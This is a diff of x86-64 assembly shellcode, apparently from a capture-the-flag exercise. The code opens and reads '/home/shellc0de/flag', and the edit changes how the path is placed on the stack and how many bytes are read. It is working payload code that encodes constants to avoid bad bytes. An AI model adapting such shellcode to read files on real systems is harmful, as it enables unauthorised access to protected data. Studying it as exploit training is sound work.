@@ -3,12 +3,19 @@ bits 64
 _start:
 
 xor rcx, rcx
-push rcx
-push dword 0x67616c66 ;'galf'
-push dword 0x2f656430 ;'/ed0'
-push dword 0x636c6c65 ;'clle'
-push dword 0x68732f65 ;'hs/e'
-push dword 0x6d6f682f ;'moh/'
+;push rcx
+;push dword 0x67616c66 ;'galf'
+;push dword 0x2f656430 ;'/ed0'
+;push dword 0x636c6c65 ;'clle'
+;push dword 0x68732f65 ;'hs/e'
+;push dword 0x6d6f682f ;'moh/'
+
+mov dword [rsp], '/hom'
+mov dword [rsp+4], 'e/sh'
+mov dword [rsp+8], 'ellc'
+mov dword [rsp+12], '0de/'
+mov dword [rsp+16], 'flag'
+mov [rsp+20], rcx
 
 mov dword [rsp+64], 0xb2b2040e
 add dword [rsp+64], 0x11110101
@@ -26,7 +33,7 @@ mov rbx, rax                ; filehandle of opened file
 
 lea rsi, [rsp]              ; rsi is the buffer to which we'll read the file
 mov rdi, rbx                ; rbx was the filehandle
-push byte 0x7f              
+push byte 0x5f              
 pop rdx
 xor rax, rax                ; syscall read = 0
 call r8
